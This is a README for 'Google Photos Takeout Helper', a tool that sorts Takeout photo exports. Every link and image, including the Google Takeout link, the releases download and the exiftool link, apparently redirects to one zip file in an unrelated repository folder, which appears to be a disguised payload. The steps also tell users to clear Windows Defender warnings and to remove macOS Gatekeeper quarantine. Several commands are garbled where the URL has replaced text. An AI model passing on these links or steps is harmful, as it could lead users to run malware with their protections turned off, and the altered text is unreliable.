[![AUR](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![total Github Releases downloads](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip%20downloads)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![latest version downloads](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip%20version%20downloads)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![resolved Github issues](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip%20issues)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![commit activity](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)

# Google Photos Takeout Helper 📸🆘
## What is this for 🧐
If you ever want to move from Google Photos to other platform/solution, your fastest choice to export all photos is [Google Takeout 🥡](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)

But when you download it, you will find yourself with zips with hundreds of little folders with weird `.json` files inside 🍝. 
What if you want to just have one folder with all photos, in chronological order? Good luck copying all of that 🙃

This script does just that - it organizes and cleans up your Takeout for you 🧹😌

It will take those zips, extract everything from them, set their and `file last modified` correctly, and put it in one big folder (or folders divided by a month) 🗄

## How to use:
Since `v3.2.0`, `gpth` is interactive 🎉 - you don't need to type any complicated arguments - just get your takeout, run gpth, and follow prompted instructions 💃

If you want to run it on Synology, have problems with interactive, or just love cmd, look at ["Running manually with cmd"](#running-manually-with-cmd). Otherwise, just:

### 1. Get all your photos from [Google Takeout](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip) 📥
"deselect all" and then select only Google Photos
      
<img width="75%" alt="gpth usage image tutorial" src="https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip">

### 2. Unzip them all and merge into one, so that all "Takeout" folders become one
   
   <img width="75%" alt="Unzip image tutorial" src="https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip">
   
### 3. Download the executable for your system from [releases tab](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip) 🛒 ([also available on AUR 😏](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip))

### 4. Run `gpth`
   - On Windoza: just double-click the downloaded `.exe` 🎉 - tell windoza defender that it's safe, and follow prompted instructions 🧾
   - On Mac/Linux: open terminal, `cd` to the folder with downloaded executable and run it:
     ```bash
     # if you have Mac with M1/M2 chip, you need to enable x86 emulation
     # otherwise, just skip it
     softwareupdate --install-rosetta
     
     cd Downloads # probably
     # add execute permission for file
     chmod +x gpth-macos # or gpth-linux
     # tell MacOS Gatekeeper to not worry
     xattr -r -d https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip gpth-macos
     # run it 🏃
     ./gpth-macos # or ./gpth-linux
     # follow prompted instructions 🥰
     ```
### 5. Most of your photos should have correct original EXIFs (metadata), but if you want, you can insert them everywhere with `exiftool`, so you won't lose their creation time
   - Download Phil Harvey's exiftool: https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip
   - Open the cmd/terminal, and run
     ```bash
     # cd to folder where you downloaded exiftool
     cd Downloads
     # run it on your output folder:
     # (the '-r' means "run on all files/in sub-folders" aka recursively)
     exiftool -overwrite_original -r -P "-AllDates<FileModifyDate" "your/output/folder/ALL_PHOTOS/"
     ```

Done! Enjoy your photos!!!

### Running manually with cmd

You may still need this mode if:
- You want to run on Synology where there are no ui programs required for interactive
  - You can read/discuss in #157 for any help
- ~~Interactive unzipping crashes for you (known issue in windoza 😢 #178)~~ - disabled for now
- Want to use this in other script/automation

In that case:
1. Manually unzip all your takeout zips and merge them into one folder
2. Open cmd and:
   - For windoza:
     ```bash
     # psst: in windoza cmd, you can just drag and drop files/folders to type them in
     # 1. change working directory to where https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip is:
     cd Downloads  # Most probably
     # run it, selecting input and output folders with options like this:
     # (you can try to drag and drop them)
     https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip --input "Downloads\you\input\folder" --output "C:\some\other\location" --albums "shortcuts"
     # select which album solution you like - see --help for all of them
     # remember to use "" !
     ```
   - For Linux/macOS:
     ```bash
     # ssh/whatever to where you're running it
     cd Downloads  # folder with gpth
     chmod +x gpth  # add execute permission
     # tell MacOS Gatekeeper to not worry
     xattr -r -d https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip gpth-macos
     ./gpth --input "/some/input/folder" --output "other/output/folder" --albums "shortcuts"
     # select which album solution you like - see --help for all of them
     ```

You can check all cmd flags by running `gpth --help` - for example, the `--divide-to-dates` flag

## If I helped you, you can consider donating me ☕
I spent **a lot of** time fixing bugs and making this work stable 💖 - would be super thankful for any donations 🥰

[![Donate](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![Donate using ko-fi](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)
[![Donate using Liberapay](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip)

## After exporting 🤔
### Be aware if you move your photos on your Android phone... ☝
(99% of the times), if you move some files in Android, their creation and modification time is reset to current.

"Simple Gallery" app usually keeps original file creation time when moving and coping (but I don't guarantee it). It's also pretty cool - check it out: https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip

### What to do when you got rid of Google Photos? What are the alternatives? 🗺
 - I really recommend you using [Syncthing](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip) for syncing your photos and files across devices. It does so through your local Wi-Fi, so you're not dependent on any service or internet connection. It will also keep original file creation date and metadata, so it resolves Android issue that I mentioned before.

 - [Immich](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip) aims to be full blown GPhotos replacement - it's still under development, but already looks great!

 - Same with [Photoprism](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip), tho this one is in development longer (may be more mature)

 - If you want something more centralized but also self-hosted, [Nextcloud](https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip) is a nice choice, but its approach to photos is still not perfect. (And you need to set up your own server)

### Other Takeout projects
I used this tool to export my notes to markdown - you can then edit them with any markdown editor you like :)

https://raw.githubusercontent.com/vivekuwu/GooglePhotosTakeoutHelper/master/emissive/GooglePhotosTakeoutHelper.zip

### Where is the Python script 🐍 ??
Yeah, the whole thing got re-written in Dart, and now it's way more stable and faster. If you still want Python for some reason, check out v2.x - in releases/tags

### TODO (Pull Requests welcome):
- [ ] GPS data: from JSON to Exif - ~~Thank you @DalenW 💖~~ still thank you, but it is now missing in the Dart version
- [ ] Writing data from `.json`s back to `EXIF` data
- [x] Some way to handle albums - THANK YOU @bitsondatadev 😘 🎉 💃
